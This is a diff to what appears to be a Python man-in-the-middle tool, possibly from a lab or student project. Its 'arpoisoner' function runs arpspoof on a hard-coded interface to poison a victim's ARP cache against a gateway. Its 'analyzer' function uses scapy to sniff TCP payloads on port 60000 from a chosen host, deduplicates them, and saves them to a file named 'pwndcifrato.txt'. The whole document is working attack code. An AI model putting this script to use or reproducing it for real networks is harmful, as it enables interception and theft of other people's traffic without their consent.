@@ -9,20 +9,19 @@ def arpoisoner(out_lck):
 
     output(out_lck, "Arp Poisoner")
 
-    intf = loop_input(out_lck, "Please insert interface's name: ")
-
     victimip = loop_input(out_lck, "Please insert victim IP (Ex 0.10): ")
 
-    targetip = loop_input(out_lck, "Please insert target IP: ")
+    gatewayip = loop_input(out_lck, "Please insert target IP: ")
 
-    os.system("xterm -e \"arpspoof -i %s -t %s %s\"" % (intf, "192.168." + victimip, "192.168." + targetip))
+    os.system("xterm -e \"arpspoof -i %s -t %s %s\"" % ("enx9cebe811a79a", "192.168." + victimip, "192.168." + gatewayip))
 
-#si so che è na porcata ma non mi viene in mente un modo migliore di farlo e si, non posso passare il file in prn
 
-def lel(file):
+def lel(array, out_lck):
+
     def out_sniff(packet):
-        file.write(bytes(packet[TCP].payload))
+        array.append(bytes(packet[TCP].payload))
     return out_sniff
+
 
 def analyzer(out_lck):
     file = open("received/pwndcifrato.txt", "wb")
@@ -31,8 +30,17 @@ def analyzer(out_lck):
 
     time = loop_int_input(out_lck, "Please insert a timeout for the sniffer (in second): ")
 
-    sniff(filter="tcp and port 60000", timeout=time, prn=lel(file))
+    destination = loop_input(out_lck, "Please insert destination IP: ")
 
+    array = []
+    result = []
+    sniff(filter="tcp and port 60000 and host %s" % ("192.168." + destination), timeout=time, prn=lel(array, out_lck))
+    for idx, el in enumerate(array):
+        if el not in result:
+            result.append(el)
+
+    for el in result:
+        file.write(el)
     file.close()
 
 
